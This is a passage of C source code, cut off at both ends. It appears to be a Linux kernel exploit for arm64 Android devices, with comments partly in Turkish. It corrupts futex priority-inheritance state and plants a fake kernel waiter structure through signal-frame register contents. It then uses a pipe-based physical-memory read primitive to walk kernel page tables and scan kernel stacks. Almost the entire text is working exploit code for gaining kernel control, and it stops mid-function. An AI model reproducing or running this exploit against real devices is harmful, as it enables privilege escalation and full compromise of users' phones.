  atomic_store_explicit(&slide_sigreturn_verify_lock, readback_lock,
                        memory_order_relaxed);
  atomic_store_explicit(&slide_sigreturn_verify_task, readback_task,
                        memory_order_relaxed);
  status = 1;

done:
  atomic_store_explicit(&slide_sigreturn_status, status,
                        memory_order_relaxed);
  atomic_store_explicit(&slide_sigreturn_done, 1, memory_order_release);
}

int slide_sigreturn_preflight(void) {
  struct sigaction action;
  struct sigaction old_action;
  memset(&action, 0, sizeof(action));
  action.sa_sigaction = slide_sigreturn_handler;
  action.sa_flags = SA_SIGINFO | SA_RESTART;
  if (sigemptyset(&action.sa_mask) != 0 ||
      sigaction(SIGUSR2, &action, &old_action) != 0) {
    pr_error("slide sigreturn preflight install errno=%d\n", errno);
    return 0;
  }

  atomic_store_explicit(&slide_sigreturn_probe_only, 1,
                        memory_order_relaxed);
  atomic_store_explicit(&slide_sigreturn_done, 0, memory_order_relaxed);
  atomic_store_explicit(&slide_sigreturn_status, 0, memory_order_relaxed);
  siginfo_t signal_info;
  memset(&signal_info, 0, sizeof(signal_info));
  signal_info.si_signo = SIGUSR2;
  signal_info.si_code = SI_QUEUE;
  signal_info.si_pid = getpid();
  signal_info.si_uid = getuid();
  errno = 0;
  int ret = (int)syscall(SYS_rt_tgsigqueueinfo, getpid(),
                         (int)syscall(SYS_gettid), SIGUSR2, &signal_info);
  int saved_errno = errno;
  int done = atomic_load_explicit(&slide_sigreturn_done,
                                  memory_order_acquire);
  int status = atomic_load_explicit(&slide_sigreturn_status,
                                    memory_order_relaxed);
  int records = atomic_load_explicit(&slide_sigreturn_record_count,
                                     memory_order_relaxed);
  pr_info("slide sigreturn preflight ret=%d errno=%d done=%d status=%d "
          "fpsimd=%d sve=%d offset=%#x records=%d\n",
          ret, saved_errno, done, status,
          atomic_load_explicit(&slide_sigreturn_found_fpsimd,
                               memory_order_relaxed),
          atomic_load_explicit(&slide_sigreturn_found_sve,
                               memory_order_relaxed),
          atomic_load_explicit(&slide_sigreturn_waiter_off,
                               memory_order_relaxed),
          records);
  for (int record = 0;
       record < records && record < SLIDE_SIGRETURN_RECORD_MAX; record++) {
    pr_info("slide sigreturn record index=%d area=%s magic=%08x size=%d\n",
            record,
            atomic_load_explicit(&slide_sigreturn_record_area[record],
                                 memory_order_relaxed) ? "extra" : "main",
            (unsigned int)atomic_load_explicit(
                &slide_sigreturn_record_magic[record], memory_order_relaxed),
            atomic_load_explicit(&slide_sigreturn_record_size[record],
                                 memory_order_relaxed));
  }
  atomic_store_explicit(&slide_sigreturn_probe_only, 0,
                        memory_order_relaxed);
  if (sigaction(SIGUSR2, &old_action, NULL) != 0) {
    pr_error("slide sigreturn preflight restore errno=%d\n", errno);
    return 0;
  }
  return ret == 0 && done && status == 1;
}

/* Scrub: waiter'in stale pi_blocked_on'unu temiz Cycle.
 * Owner scrub kilidini tutarken waiter bloklanir (pi=fresh valid waiter),
 * owner unlock'layinca slowpath acquire -> pi_blocked_on=NULL.
 * Tum yollar sinirli surede biter; basarisizlikta eski davranis (yurume). */
static void slide_scrub_pi_state(void) {
  uint64_t start = gettime_ns();
  while (!atomic_load(&slide_scrub_held)) {
    if (gettime_ns() - start > 4000000000ULL) {
      pr_info("slide scrub skip held-timeout\n");
      return;
    }
    __asm__ volatile("yield" ::: "memory");
  }
  uint64_t held_seen = gettime_ns();
  struct timespec ts;
  /* FUTEX_LOCK_PI timeout'u absolute REALTIME ister (MONOTONIC +5s = 1970 =
   * gecmis -> aninda ETIMEDOUT; lock_ms=0 ile kanitlandi). */
  SYSCHK(clock_gettime(CLOCK_REALTIME, &ts));
  ts.tv_sec += 5;
  errno = 0;
  long lr = futex_op(&slide_f_scrub, FUTEX_LOCK_PI, 0, &ts, NULL, 0);
  int le = errno;
  uint64_t lock_done = gettime_ns();
  if (lr != 0) {
    pr_info("slide scrub lock failed ret=%ld errno=%d held_wait_ms=%llu lock_ms=%llu\n",
            lr, le, (unsigned long long)(held_seen - start) / 1000000ULL,
            (unsigned long long)(lock_done - held_seen) / 1000000ULL);
    return;
  }
  pr_info("slide scrub locked held_wait_ms=%llu lock_ms=%llu\n",
          (unsigned long long)(held_seen - start) / 1000000ULL,
          (unsigned long long)(lock_done - held_seen) / 1000000ULL);
  if (futex_op(&slide_f_scrub, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("slide scrub unlock errno=%d\n", errno);
  }
  atomic_store(&slide_scrub_acquired, 1);
  pr_info("slide scrub done\n");
}

#if defined(SLIDE_STACK_WRITER) && \
    defined(SLIDE_STACK_WRITER_SIGRETURN) && \
    SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_SIGRETURN
/* Erken teslim testi: waiter blokluyken (WAIT_REQUEUE_PI icinde) owner
 * sinyali gonderir. Handler wait ONCESI kurulur (yoksa SIGUSR2 oldurur).
 * Payload henuz dolmadigindan erken kopya sifirlari tasir (zararsiz);
 * self-send sonradan gercek plant'i yapar. */
static void slide_sigreturn_arm_waiter(void) {
  struct sigaction action;
  memset(&action, 0, sizeof(action));
  action.sa_sigaction = slide_sigreturn_handler;
  action.sa_flags = SA_SIGINFO | SA_RESTART;
  if (sigemptyset(&action.sa_mask) == 0 &&
      sigaction(SIGUSR2, &action, NULL) == 0) {
    atomic_store_explicit(&slide_sigreturn_done, 0, memory_order_relaxed);
    atomic_store_explicit(&slide_sigreturn_status, 0, memory_order_relaxed);
    pr_info("slide sigreturn waiter-armed tid=%d\n",
            (int)syscall(SYS_gettid));
  } else {
    pr_error("slide sigreturn waiter-arm errno=%d\n", errno);
  }
}

static void slide_sigreturn_poke_waiter(int tid) {
  siginfo_t si;
  memset(&si, 0, sizeof(si));
  si.si_signo = SIGUSR2;
  si.si_code = SI_QUEUE;
  si.si_pid = getpid();
  si.si_uid = getuid();
  errno = 0;
  int ret = (int)syscall(SYS_rt_tgsigqueueinfo, getpid(), tid,
                         SIGUSR2, &si);
  pr_info("slide sigreturn early-poke tid=%d ret=%d errno=%d t=%llu\n",
          tid, ret, errno, (unsigned long long)gettime_ns());
}
#endif

#if defined(SLIDE_STACK_WRITER) && \
    defined(SLIDE_STACK_WRITER_SIGRETURN) && \
    SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_SIGRETURN
/* Pre-wait payload doldurma: erken plant icin stack_copy'deki doldurma ile
 * birebir ayni icerik (grad/spray/gercek + marker + probe). Erken teslimatta
 * handler bunu kopyalar; writer fazinda tekrar doldurulmaz. */
static void slide_sigreturn_fill_payload(void) {
#if defined(SLIDE_SIGRETURN_GRADIENT)
  for (size_t i = 0; i < sizeof(slide_sigreturn_payload_fpsimd); i += 8) {
    uint64_t m = 0x4242000000000000ULL | (uint64_t)i;
    memcpy(slide_sigreturn_payload_fpsimd + i, &m, sizeof(m));
  }
  for (size_t i = 0; i < sizeof(slide_sigreturn_payload_sve); i += 8) {
    uint64_t m = 0x4242000000000000ULL | (uint64_t)i;
    memcpy(slide_sigreturn_payload_sve + i, &m, sizeof(m));
  }
  pr_info("slide gradient filled size=%zu\n",
          sizeof(slide_sigreturn_payload_fpsimd));
#elif defined(SLIDE_SIGRETURN_SPRAY)
  for (size_t i = 0; i < sizeof(slide_sigreturn_payload_fpsimd); i++) {
    slide_sigreturn_payload_fpsimd[i] = (unsigned char)(i & 0xff);
  }
  for (size_t i = 0; i < sizeof(slide_sigreturn_payload_sve); i++) {
    slide_sigreturn_payload_sve[i] = (unsigned char)(i & 0xff);
  }
  pr_info("slide spray pattern filled size=%zu\n",
          sizeof(slide_sigreturn_payload_fpsimd));
#else
  memset(slide_sigreturn_payload_fpsimd, 0,
         sizeof(slide_sigreturn_payload_fpsimd));
  memset(slide_sigreturn_payload_sve, 0,
         sizeof(slide_sigreturn_payload_sve));
  slide_build_fake_waiter(slide_sigreturn_payload_fpsimd,
                          slide_sig_off_fpsimd());
  slide_build_fake_waiter(slide_sigreturn_payload_sve,
                          slide_sig_off_sve());
#endif
#if defined(SLIDE_MARKER_LOCK) && !defined(SLIDE_SIGRETURN_SPRAY) && \
    !defined(SLIDE_SIGRETURN_GRADIENT)
  {
    uint64_t marker = 0x4242424242424242ULL;
    memcpy(slide_sigreturn_payload_fpsimd + slide_sig_off_fpsimd() +
               FAKE_WAITER_LOCK_OFF,
           &marker, sizeof(marker));
    memcpy(slide_sigreturn_payload_sve + slide_sig_off_sve() +
               FAKE_WAITER_LOCK_OFF,
           &marker, sizeof(marker));
    pr_info("slide marker lock planted\n");
  }
#endif
#if !defined(SLIDE_SIGRETURN_SPRAY) && !defined(SLIDE_SIGRETURN_GRADIENT)
  {
    uint64_t *waiter_words =
        (uint64_t *)(slide_sigreturn_payload_fpsimd +
                     slide_sig_off_fpsimd());
    pr_info("slide stack waiter tree=%016llx/%016llx/%016llx "
            "pi=%016llx/%016llx/%016llx task=%016llx lock=%016llx\n",
            (unsigned long long)waiter_words[0],
            (unsigned long long)waiter_words[1],
            (unsigned long long)waiter_words[2],
            (unsigned long long)waiter_words[3],
            (unsigned long long)waiter_words[4],
            (unsigned long long)waiter_words[5],
            (unsigned long long)waiter_words[6],
            (unsigned long long)waiter_words[7]);
  }
#endif
}
#endif

static void slide_sigreturn_stack_copy(void) {
  pr_info("slide writer-copy-start t=%llu tid=%d\n",
          (unsigned long long)gettime_ns(), (int)syscall(SYS_gettid));
  int early_planted =
      atomic_load_explicit(&slide_sigreturn_done, memory_order_relaxed) == 1 &&
      atomic_load_explicit(&slide_sigreturn_status, memory_order_relaxed) == 1;
  pr_info("slide early-planted=%d\n", early_planted);
  /* Erken plant varsa payload korunur (tekrar doldurma YOK). */
  if (!early_planted) {
#if defined(SLIDE_SIGRETURN_GRADIENT)
  /* Gradyan: her 8-byte slot kendi ofsetini kodlar (0x4242....|off).
   * Walk payload'in HERHANGI bir yerini lock/pointer olarak okursa fault
   * adresi dogrudan ofseti verir. Tek kosuda tum pencere taranir. */
  for (size_t i = 0; i < sizeof(slide_sigreturn_payload_fpsimd); i += 8) {
    uint64_t m = 0x4242000000000000ULL | (uint64_t)i;
    memcpy(slide_sigreturn_payload_fpsimd + i, &m, sizeof(m));
  }
  for (size_t i = 0; i < sizeof(slide_sigreturn_payload_sve); i += 8) {
    uint64_t m = 0x4242000000000000ULL | (uint64_t)i;
    memcpy(slide_sigreturn_payload_sve + i, &m, sizeof(m));
  }
  pr_info("slide gradient filled size=%zu\n",
          sizeof(slide_sigreturn_payload_fpsimd));
#elif defined(SLIDE_SIGRETURN_SPRAY)
  /* Kalibrasyon spray'i: her byte ofsetini kodlar (i & 0xFF).
   * Fake waiter YOK — amaç desenin kernel stack'te nereye düştüğünü ölçmek. */
  for (size_t i = 0; i < sizeof(slide_sigreturn_payload_fpsimd); i++) {
    slide_sigreturn_payload_fpsimd[i] = (unsigned char)(i & 0xff);
  }
  for (size_t i = 0; i < sizeof(slide_sigreturn_payload_sve); i++) {
    slide_sigreturn_payload_sve[i] = (unsigned char)(i & 0xff);
  }
  pr_info("slide spray pattern filled size=%zu\n",
          sizeof(slide_sigreturn_payload_fpsimd));
#else
  memset(slide_sigreturn_payload_fpsimd, 0,
         sizeof(slide_sigreturn_payload_fpsimd));
  memset(slide_sigreturn_payload_sve, 0,
         sizeof(slide_sigreturn_payload_sve));
  slide_build_fake_waiter(slide_sigreturn_payload_fpsimd,
                          slide_sig_off_fpsimd());
  slide_build_fake_waiter(slide_sigreturn_payload_sve,
                          slide_sig_off_sve());
#endif
#if defined(SLIDE_MARKER_LOCK) && !defined(SLIDE_SIGRETURN_SPRAY) && \
    !defined(SLIDE_SIGRETURN_GRADIENT)
  /* Marker deneyi: gercek waiter, sadece lock=0x42..42. Walk plant'i
   * okuyorsa panic fault addr marker olur; gormuyorsa 0 kalir. */
  {
    uint64_t marker = 0x4242424242424242ULL;
    memcpy(slide_sigreturn_payload_fpsimd + slide_sig_off_fpsimd() +
               FAKE_WAITER_LOCK_OFF,
           &marker, sizeof(marker));
    memcpy(slide_sigreturn_payload_sve + slide_sig_off_sve() +
               FAKE_WAITER_LOCK_OFF,
           &marker, sizeof(marker));
    pr_info("slide marker lock planted\n");
  }
#endif
#if !defined(SLIDE_SIGRETURN_SPRAY) && !defined(SLIDE_SIGRETURN_GRADIENT)
  uint64_t *probe_vreg0 = (uint64_t *)slide_sigreturn_payload_fpsimd;
  probe_vreg0[0] = 0x1111222233334444ULL;
  probe_vreg0[1] = 0x5555666677778888ULL;
  uint64_t *waiter_words =
      (uint64_t *)(slide_sigreturn_payload_fpsimd +
                   slide_sig_off_fpsimd());
  pr_info("slide stack waiter tree=%016llx/%016llx/%016llx "
          "pi=%016llx/%016llx/%016llx task=%016llx lock=%016llx\n",
          (unsigned long long)waiter_words[0],
          (unsigned long long)waiter_words[1],
          (unsigned long long)waiter_words[2],
          (unsigned long long)waiter_words[3],
          (unsigned long long)waiter_words[4],
          (unsigned long long)waiter_words[5],
          (unsigned long long)waiter_words[6],
          (unsigned long long)waiter_words[7]);
#endif
  }

  /* Logger thread for syscall-free oracle exfiltration (spawned BEFORE
   * any signal/plant activity; clone frames unwind pre-plant). The
   * SLIDE_SIG_OFF override is read lazily by the helpers. */
  {
    atomic_store(&slide_fpu_log_ready, 0);
    {
      pthread_t fpu_logger;
      pthread_create(&fpu_logger, NULL, slide_fpu_logger_thread, NULL);
      pthread_detach(fpu_logger);
    }
  }

  struct sigaction action;
  struct sigaction old_action;
  memset(&action, 0, sizeof(action));
  action.sa_sigaction = slide_sigreturn_handler;
  action.sa_flags = SA_SIGINFO | SA_RESTART;
  if (sigemptyset(&action.sa_mask) != 0) {
    pr_error("slide sigreturn sigemptyset errno=%d\n", errno);
    return;
  }
  if (sigaction(SIGUSR2, &action, &old_action) != 0) {
    pr_error("slide sigreturn sigaction install errno=%d\n", errno);
    return;
  }
  {
    struct sigaction ill_action;
    struct sigaction ill_old;
    memset(&ill_action, 0, sizeof(ill_action));
    ill_action.sa_handler = slide_sigill_handler;
    sigemptyset(&ill_action.sa_mask);
    sigaction(SIGILL, &ill_action, &ill_old);
  }

  slide_reset_consume_state();
  pr_info("slide sigreturn early-delivery done=%d status=%d\n",
          atomic_load_explicit(&slide_sigreturn_done, memory_order_relaxed),
          atomic_load_explicit(&slide_sigreturn_status,
                               memory_order_relaxed));
  /* Erken plant varsa atomiklerdeki erken degerler (vregs/readback) korunur. */
  if (!early_planted) {
  atomic_store_explicit(&slide_sigreturn_done, 0, memory_order_relaxed);
  atomic_store_explicit(&slide_sigreturn_status, 0, memory_order_relaxed);
  atomic_store_explicit(&slide_sigreturn_found_fpsimd, 0,
                        memory_order_relaxed);
  atomic_store_explicit(&slide_sigreturn_found_sve, 0,
                        memory_order_relaxed);
  atomic_store_explicit(&slide_sigreturn_waiter_off, -1,
                        memory_order_relaxed);
  atomic_store_explicit(&slide_sigreturn_vregs_addr, 0,
                        memory_order_relaxed);
  atomic_store_explicit(&slide_sigreturn_verify_lock, 0,
                        memory_order_relaxed);
  atomic_store_explicit(&slide_sigreturn_verify_task, 0,
                        memory_order_relaxed);
  }

  int tid = (int)syscall(SYS_gettid);
  errno = 0;
  siginfo_t signal_info;
  memset(&signal_info, 0, sizeof(signal_info));
  signal_info.si_signo = SIGUSR2;
  signal_info.si_code = SI_QUEUE;
  signal_info.si_pid = getpid();
  signal_info.si_uid = getuid();
  __asm__ volatile("movi v0.2d, #0\n\tmovi v1.2d, #0" ::: "memory");
  slide_fpu_trapped = 0;
  int ret = 0;
  if (!early_planted) {
    ret = (int)syscall(SYS_rt_tgsigqueueinfo, getpid(), tid,
                       SIGUSR2, &signal_info);
  } else {
    /* Cift plant: erken (derin/wakeup) + self (sig/writer). Walk ikisinden
     * birini okursa fault marker olur. */
    pr_info("slide dual plant: early kept + self-send\n");
    ret = (int)syscall(SYS_rt_tgsigqueueinfo, getpid(), tid,
                       SIGUSR2, &signal_info);
  }
  unsigned char fpu_probe[96];
  __asm__ volatile("stp q0, q1, [%0]\n\tstp q24, q25, [%0, #32]\n\t"
                   "stp q22, q23, [%0, #64]" : : "r"(fpu_probe) : "memory");
  int fpu_trapped = slide_fpu_trapped;
  uint64_t fpu_q0_lo = *(uint64_t *)&fpu_probe[0];
  uint64_t fpu_q0_hi = *(uint64_t *)&fpu_probe[8];
  uint64_t fpu_q1_lo = *(uint64_t *)&fpu_probe[16];
  uint64_t fpu_q1_hi = *(uint64_t *)&fpu_probe[24];
  uint64_t fpu_q24_lo = *(uint64_t *)&fpu_probe[32];
  uint64_t fpu_q24_hi = *(uint64_t *)&fpu_probe[40];
  uint64_t fpu_q25_lo = *(uint64_t *)&fpu_probe[48];
  uint64_t fpu_q25_hi = *(uint64_t *)&fpu_probe[56];
  uint64_t fpu_q22_lo = *(uint64_t *)&fpu_probe[64];
  uint64_t fpu_q22_hi = *(uint64_t *)&fpu_probe[72];
  uint64_t fpu_q23_lo = *(uint64_t *)&fpu_probe[80];
  uint64_t fpu_q23_hi = *(uint64_t *)&fpu_probe[88];
#if defined(SLIDE_MARKER_LOCK) || defined(SLIDE_SIGRETURN_GRADIENT)
  /* Oracle exfiltration WITHOUT a syscall on this thread (S22U §4f):
   * stash values, wake the logger thread (own stack), proceed straight
   * to the consumer handshake. The old inline pr_info here issued a
   * write() whose deep file-write frames could tear the just-planted
   * waiter slot before the walk. */
  slide_fpu_log[0] = fpu_q24_lo;
  slide_fpu_log[1] = fpu_q24_hi;
  slide_fpu_log[2] = fpu_q0_lo;
  slide_fpu_log[3] = fpu_q0_hi;
  slide_fpu_log[4] = (uint64_t)slide_sig_off_fpsimd();
  slide_fpu_log[5] = (uint64_t)ret;
  atomic_store(&slide_fpu_log_ready, 1);
#endif
  /* Oracle-only mode (SLIDE_ORACLE_ONLY=1): copy-oracle WITHOUT any walk.
   * Returns right after stashing fpu values (logger thread prints them);
   * skips diag/scrub/consume entirely, so no panic is possible. The fpu24
   * line tells whether the kernel copy landed (marker) or not (zeros). */
  {
    const char *oracle = getenv("SLIDE_ORACLE_ONLY");
    if (oracle && *oracle && *oracle != '0') {
      usleep(200000); /* let logger thread flush fpu24 line */
      return;
    }
  }
  int saved_errno = errno;
  int handler_done = atomic_load_explicit(&slide_sigreturn_done,
                                          memory_order_acquire);
  int handler_status = atomic_load_explicit(&slide_sigreturn_status,
                                            memory_order_relaxed);

  if (ret == 0 && handler_done && handler_status == 1) {
#ifdef SLIDE_NO_DIAG
    /* Temiz test: walk oncesi waiter tarafinda HICBIR write syscall'i
     * kalmasin (plant'i ezen tek supheli). Loglar handshake sonrasina. */
#endif
#ifndef SLIDE_NO_DIAG
    int diag_fd = open_ashmem_device();
    uint64_t diag_sw = 0;
    uint64_t diag_phys = 0;
    uint64_t diag_lk = 0;
    int diag_chan_ok = 0;
    int diag_sw_ok = 0;
    uint64_t diag_chan_probe = 0xdeadbeefdeadbeefULL;
    uint64_t diag_chan_want = 0;
    if (diag_fd >= 0) {
      /* NOT: fake_fops slide/bank modunda daima 0 (sadece FOPS yolu kurar),
       * o yuzden eski configfs probe okumasi cop. Kanal problari pipe
       * uzerinden: fake_lock ilk qword'u bank tarafindan yazildi
       * (u32 0 + waiter low32). */
      if (is_direct_ptr(fake_lock)) {
        uintptr_t chan_waiter = fake_lock + SLIDE_BANK_WAITER_OFF;
        diag_chan_want = ((uint64_t)(uint32_t)chan_waiter) << 32;
      }
      pr_info("slide diag chan pipebuf_base=%016zx pipe_idx=%d pipe_addr=%016zx "
              "task=%016zx lock=%016zx want=%016llx\n",
              pipebuf_page_base, pipebuf_pipe_idx, pipebuf_addr,
              fake_task, fake_lock, (unsigned long long)diag_chan_want);
      if (pipebuf_page_base != 0 && pipebuf_pipe_idx >= 0 &&
          is_direct_ptr(fake_lock) &&
          pipe_phys_read_data(diag_fd, fake_lock, &diag_chan_probe,
                              sizeof(diag_chan_probe))) {
        diag_chan_ok = 1;
      }
      pr_info("slide diag chan_ok=%d probe=%016llx want=%016llx\n",
              diag_chan_ok, (unsigned long long)diag_chan_probe,
              (unsigned long long)diag_chan_want);
      if (is_direct_ptr(fake_task + FAKE_TASK_PI_BLOCKED_ON_OFF) &&
          pipe_phys_read_data(diag_fd,
                              fake_task + FAKE_TASK_PI_BLOCKED_ON_OFF,
                              &diag_sw, sizeof(diag_sw))) {
        diag_sw_ok = 1;
      }
      pr_info("slide diag sw_ok=%d sw=%016llx\n",
              diag_sw_ok, (unsigned long long)diag_sw);
      if (diag_sw_ok && diag_sw) {
        uintptr_t pgd = data_direct_addr(0xffffffc011a14000ULL);
        uintptr_t e = 0;
        uintptr_t phys = 0;
        if (pipe_phys_read_data(diag_fd, pgd + ((diag_sw >> 30) & 0x1ff) * 8,
                                &e, 8) && (e & 3) == 3) {
          phys = e & 0x0000fffffffff000ULL;
          uintptr_t pmd = phys - P0_PHYS_OFFSET + P0_PAGE_OFFSET;
          if (pipe_phys_read_data(diag_fd,
                                  pmd + ((diag_sw >> 21) & 0x1ff) * 8,
                                  &e, 8) && (e & 3) == 3) {
            phys = e & 0x0000fffffffff000ULL;
            uintptr_t pte = phys - P0_PHYS_OFFSET + P0_PAGE_OFFSET;
            if (pipe_phys_read_data(diag_fd,
                                    pte + ((diag_sw >> 12) & 0x1ff) * 8,
                                    &e, 8) && (e & 3) == 3) {
              diag_phys = (e & 0x0000fffffffff000ULL) | (diag_sw & 0xfff);
              uintptr_t direct =
                  diag_phys - P0_PHYS_OFFSET + P0_PAGE_OFFSET;
              pipe_phys_read_data(diag_fd, direct + FAKE_WAITER_LOCK_OFF,
                                  &diag_lk, 8);
#ifdef SLIDE_SIGRETURN_SPRAY
              /* Tam stack taraması: diag_sw etrafında ±0x1000, 8'er byte.
               * Spray deseni payload[i]=i&0xFF olduğundan, kernel stack'te
               * ardışık 8 byte'ın desenle eşleştiği offset aranır.
               * Sadece eşleşmeler loglanır (spam yok). */
              {
                uintptr_t stack_base =
                    (diag_phys - P0_PHYS_OFFSET + P0_PAGE_OFFSET) & ~0xfffULL;
                uintptr_t stack_direct_base = stack_base;
                int spray_hits = 0;
                for (int s_off = -0x1000; s_off <= 0x1000; s_off += 8) {
                  int64_t target_phys =
                      (int64_t)diag_phys + (int64_t)s_off;
                  if (target_phys < (int64_t)P0_PHYS_OFFSET) {
                    continue;
                  }
                  uintptr_t target_direct =
                      (uintptr_t)target_phys - P0_PHYS_OFFSET + P0_PAGE_OFFSET;
                  uint64_t word = 0;
                  if (!pipe_phys_read_data(diag_fd, target_direct, &word, 8)) {
                    continue;
                  }
                  /* word'ün 8 byte'ını desenle karşılaştır: her payload
                   * konumu p için beklenen qword'u kur, eşleşirse logla. */
                  for (size_t p = 0; p + 8 <= 0x200; p++) {
                    uint64_t expect = 0;
                    for (int b = 0; b < 8; b++) {
                      expect |= ((uint64_t)((p + b) & 0xff)) << (b * 8);
                    }
                    if (word == expect) {
                      pr_info("slide spray hit stack_off=%+d payload_off=%#zx "
                              "word=%016llx\n",
                              s_off, p, (unsigned long long)word);
                      spray_hits++;
                      if (spray_hits >= 16) {
                        break;
                      }
                      break;
                    }
                  }
                  if (spray_hits >= 16) {
                    break;
                  }
                }
                pr_info("slide spray scan done hits=%d base=%016llx sw=%016llx\n",
                        spray_hits, (unsigned long long)stack_direct_base,
                        (unsigned long long)diag_sw);
                (void)stack_direct_base;
              }
#endif
            }
          }
        }
      }
      close(diag_fd);
    }
    pr_info("slide diag chan_ok=%d sw_ok=%d "
            "stale_waiter=%016llx phys=%016llx lock=%016llx "
            "fake_lock=%016llx fake_task=%016llx vregs=%016llx "
            "rb_lock=%016llx rb_task=%016llx "
            "fpu_trap=%d fpu0=%016llx/%016llx/%016llx/%016llx "
            "lock=%016llx/%016llx dead=%016llx/%016llx "
            "task=%016llx/%016llx/%016llx/%016llx tid=%d\n",
            diag_chan_ok, diag_sw_ok,
            (unsigned long long)diag_sw, (unsigned long long)diag_phys,
            (unsigned long long)diag_lk, (unsigned long long)fake_lock,
            (unsigned long long)fake_task,
            (unsigned long long)atomic_load_explicit(
                &slide_sigreturn_vregs_addr, memory_order_relaxed),
            (unsigned long long)atomic_load_explicit(
                &slide_sigreturn_verify_lock, memory_order_relaxed),
            (unsigned long long)atomic_load_explicit(
                &slide_sigreturn_verify_task, memory_order_relaxed),
            fpu_trapped,
            (unsigned long long)fpu_q0_lo, (unsigned long long)fpu_q0_hi,
            (unsigned long long)fpu_q1_lo, (unsigned long long)fpu_q1_hi,
            (unsigned long long)fpu_q24_lo, (unsigned long long)fpu_q24_hi,
            (unsigned long long)fpu_q25_lo, (unsigned long long)fpu_q25_hi,
            (unsigned long long)fpu_q22_lo, (unsigned long long)fpu_q22_hi,
            (unsigned long long)fpu_q23_lo, (unsigned long long)fpu_q23_hi,
            (int)syscall(SYS_gettid));
    fflush(NULL);
    fsync(STDOUT_FILENO);
#endif /* SLIDE_NO_DIAG */
#ifndef SLIDE_NO_SCRUB
    slide_scrub_pi_state();
#endif
    atomic_store(&slide_consume_go, 1);
    while (!atomic_load(&slide_consume_stop)) {
      __asm__ volatile("yield" ::: "memory");
    }
    atomic_store(&slide_consume_go, 0);
  }

  int sched_ok = atomic_load(&slide_consume_sched_ok);
  atomic_store(&slide_stack_write_window,
               ret == 0 && handler_done && handler_status == 1 &&
               sched_ok > 0);
#ifdef SLIDE_MEASURE_ONLY
  /* Olcum: tuketici atlandigindan verify asamalari (gate/probe/scan) hic
   * kosmuyor. Pencereyi zorla ac ki driver verify'a ilerlesin; walk yok,
   * panik riski yok. */
  atomic_store(&slide_stack_write_window, 1);
  pr_info("slide measure force-window\n");
#endif
  pr_info("slide sigreturn returned offset=%#x ret=%d errno=%d "
          "handler_done=%d status=%d fpsimd=%d sve=%d calls=%d "
          "sched_ok=%d last_sched_ret=%d last_sched_errno=%d "
          "vregs=%016llx rb_lock=%016llx rb_task=%016llx\n",
          atomic_load_explicit(&slide_sigreturn_waiter_off,
                               memory_order_relaxed),
          ret, saved_errno, handler_done, handler_status,
          atomic_load_explicit(&slide_sigreturn_found_fpsimd,
                               memory_order_relaxed),
          atomic_load_explicit(&slide_sigreturn_found_sve,
                               memory_order_relaxed),
          atomic_load(&slide_consume_calls), sched_ok,
          atomic_load(&slide_consume_last_sched_ret),
          atomic_load(&slide_consume_last_sched_errno),
          (unsigned long long)atomic_load_explicit(
              &slide_sigreturn_vregs_addr, memory_order_relaxed),
          (unsigned long long)atomic_load_explicit(
              &slide_sigreturn_verify_task, memory_order_relaxed));

  if (sigaction(SIGUSR2, &old_action, NULL) != 0) {
    pr_error("slide sigreturn sigaction restore errno=%d\n", errno);
  }
}

/* Direct copy-oracle WITHOUT any dance/page/consumer (panic-free):
 * fills the marker payload, runs the signal+restore, stashes fpu values
 * (logger prints them). Call ONLY in ORACLE mode, then exit. */
void slide_sigreturn_oracle_direct(void) {
  slide_sigreturn_fill_payload();
  slide_sigreturn_stack_copy();
  /* stack_copy returns early in ORACLE mode (after logger flag). */
  usleep(300000); /* let logger thread flush fpu24 line */
  pr_info("slide oracle direct done (see fpu24 line above)\n");
  fflush(NULL);
  fsync(STDOUT_FILENO);
}
#endif

#if defined(SLIDE_SYNC_PSELECT_SYSCALL) && SLIDE_SYNC_PSELECT_SYSCALL
static long slide_read_task_syscall_nr(int tid) {
  char path[64];
  snprintf(path, sizeof(path), "/proc/self/task/%d/syscall", tid);
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return -1;
  }
  char buf[128];
  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  close(fd);
  if (n <= 0) {
    return -1;
  }
  buf[n] = 0;
  char *end = NULL;
  errno = 0;
  long nr = strtol(buf, &end, 0);
  if (errno || end == buf) {
    return -1;
  }
  return nr;
}

static int slide_read_task_wchan(int tid, char *buf, size_t size) {
  char path[64];
  snprintf(path, sizeof(path), "/proc/self/task/%d/wchan", tid);
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }
  ssize_t n = read(fd, buf, size - 1);
  close(fd);
  if (n <= 0) {
    return 0;
  }
  buf[n] = 0;
  char *newline = strchr(buf, '\n');
  if (newline) {
    *newline = 0;
  }
  return 1;
}

static int slide_task_blocked_in_pselect(int tid, char *wchan, size_t size) {
  if (slide_read_task_syscall_nr(tid) != SYS_pselect6 ||
      !slide_read_task_wchan(tid, wchan, size)) {
    return 0;
  }
  return strncmp(wchan, "do_select", strlen("do_select")) == 0;
}

static int slide_wait_for_pselect_blocked(int tid, size_t timeout_usec,
                                          int confirmations,
                                          size_t *elapsed_usec,
                                          char *last_wchan,
                                          size_t last_wchan_size) {
  size_t started = gettime_ns();
  size_t deadline = started + timeout_usec * 1000ULL;
  int synced = 0;
  while (gettime_ns() < deadline) {
    if (slide_task_blocked_in_pselect(tid, last_wchan,
                                      last_wchan_size)) {
      synced++;
      if (synced >= confirmations) {
        break;
      }
      usleep(100);
    } else {
      synced = 0;
      __asm__ volatile("yield" ::: "memory");
    }
  }
  if (elapsed_usec) {
    *elapsed_usec = (gettime_ns() - started) / 1000ULL;
  }
  return synced >= confirmations;
}
#endif

void *slide_consumer_thread(void *arg __attribute__((unused))) {
#if !(defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE)
  disable_rseq_for_thread();
#endif
  pin_to_core(CONSUMER_CORE);
  atomic_store(&slide_consumer_ready, 1);
  int *errno_ptr = &errno;

  int seen = 0;
  for (;;) {
#if defined(O1S_EARLY_FIRE) && O1S_EARLY_FIRE
    /* TEMP-TEST early-fire: waiter PI-block penceresindeyken (deadlock_seen
     * + wchan=futex_wait_queue_me, henuz timeout-OK yok) stamp+walk yap;
     * post-timeout stale-FIRE'i tamamen atla (reboot yok, attempt devam). */
    {
      int _dl = atomic_load(&slide_deadlock_seen);
      int _wok = atomic_load(&slide_waiter_ok);
